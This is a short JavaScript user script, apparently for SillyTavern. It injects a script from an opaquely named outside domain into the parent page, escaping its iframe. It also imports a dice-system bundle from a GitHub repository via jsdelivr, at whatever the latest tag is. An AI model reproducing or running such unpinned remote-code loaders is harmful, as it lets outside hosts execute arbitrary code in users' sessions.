function injectScript(iframe, id, url) {
  /* inject a script into the parent window */
  let parent = iframe.parentElement;
  // go up until body
  while (parent && parent.tagName !== 'BODY') {
    parent = parent.parentElement;
  }
  console.log(parent);
  // skip if script already exists
  if (document.getElementById(id)) {
    console.log('script already exists');
    return;
  }
  const script = document.createElement('script');
  script.id = id;
  script.src = url;
  parent.appendChild(script);
}


$(() => {
  SillyTavern.extensionSettings.regexBinding_scriptId = getScriptId();
  injectScript(window.frameElement, getScriptId(), 'https://jnai2d9kgnbs6xzx5c.com/regex_bind/inject.js');
});

async function getLatestVersion() {
  try {
    const response = await fetch('https://api.github.com/repos/jerryzmtz/my-tavern-scripts/tags');
    const tags = await response.json();
    return tags[0]?.name || 'main';
  } catch {
    return 'main';
  }
}

const version = await getLatestVersion();
import(`https://testingcf.jsdelivr.net/gh/jerryzmtz/my-tavern-scripts@${version}/dist/骰子系统/stable.js`);

